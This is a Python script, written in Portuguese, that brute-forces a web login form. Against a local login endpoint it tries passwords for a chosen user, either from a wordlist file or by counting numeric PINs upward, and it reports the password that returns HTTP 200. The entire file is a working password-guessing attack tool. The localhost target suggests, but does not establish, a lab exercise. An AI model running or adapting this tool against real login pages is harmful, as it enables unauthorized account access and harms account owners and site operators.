import sys
import requests

URL = "http://127.0.0.1:5000/login"


def tentar(usuario, senha):
    resposta = requests.post(URL, data={"usuario": usuario, "senha": senha})
    return resposta.status_code == 200


def ataque_wordlist(usuario, caminho_wordlist):
    with open(caminho_wordlist, encoding="utf-8") as arquivo:
        for linha in arquivo:
            senha = linha.strip()
            if not senha:
                continue
            print("Testando senha:", senha)
            if tentar(usuario, senha):
                print("Senha encontrada:", senha)
                return senha
    print("Senha nao encontrada.")
    return None


def ataque_pin(usuario, maximo=999):
    tentativa = 0
    while tentativa <= maximo:
        senha = str(tentativa)
        print("Testando senha:", senha)
        if tentar(usuario, senha):
            print("Senha encontrada:", senha)
            return senha
        tentativa = tentativa + 1
    print("Senha nao encontrada.")
    return None


def main():
    if len(sys.argv) < 3:
        print("Uso:")
        print("  python brute_force.py wordlist <usuario> [arquivo]")
        print("  python brute_force.py pin <usuario> [maximo]")
        return

    modo = sys.argv[1]
    usuario = sys.argv[2]

    if modo == "wordlist":
        arquivo = sys.argv[3] if len(sys.argv) > 3 else "wordlist.txt"
        ataque_wordlist(usuario, arquivo)
    elif modo == "pin":
        maximo = int(sys.argv[3]) if len(sys.argv) > 3 else 999
        ataque_pin(usuario, maximo)
    else:
        print("Modo invalido. Use 'wordlist' ou 'pin'.")


if __name__ == "__main__":
    main()
